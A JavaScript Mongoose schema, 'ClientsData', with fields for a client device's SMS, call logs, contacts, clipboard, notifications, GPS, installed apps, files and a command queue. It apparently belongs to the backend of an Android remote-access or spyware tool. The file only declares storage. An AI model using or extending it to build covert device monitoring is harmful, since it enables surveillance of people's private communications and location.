// Require Dependencies
const mongoose = require('mongoose');
const SchemaTypes = mongoose.Schema.Types;

// Setup  Schema
const ClientsDataSchema = new mongoose.Schema({
  // Basic fields

  user:{
    type: String,
  },
  clientID: String
  ,
  SMSData: {
    type: SchemaTypes.Array,
    default: [],
  },
  CallData: {
    type: SchemaTypes.Array,
    default: [],
  },
  contacts: {
    type: SchemaTypes.Array,
    default: [],
  },
  wifiNow: {
    type: SchemaTypes.Array,
    default: [],
  },
  wifiLog: {
    type: SchemaTypes.Array,
    default: [],
  },
  clipboardLog:{
    type: SchemaTypes.Array,
    default: [],
  },
  notificationLog: {
    type: SchemaTypes.Array,
    default: [],
  },
  enabledPermissions: {
    type: SchemaTypes.Array,
    default: [],
  },
  apps: {
    type: SchemaTypes.Array,
    default: [],
  },
  GPSData: {
    type: SchemaTypes.Array,
    default: [],
  },
  CommandQue: {
    type: SchemaTypes.Array,
    default: [],
  },
  GPSSettings: {
    type: Object,
    default: {},
  },
  downloads: {
    type: SchemaTypes.Array,
    default: [],
  },
  currentFolder: {
    type: SchemaTypes.Array,
    default: [],
  },

  // When this user was created
  created: {
    type: Date,
    default: Date.now,
  },
});

// Create and export the new model
const ClientsData = (module.exports = mongoose.model('ClientsData', ClientsDataSchema));
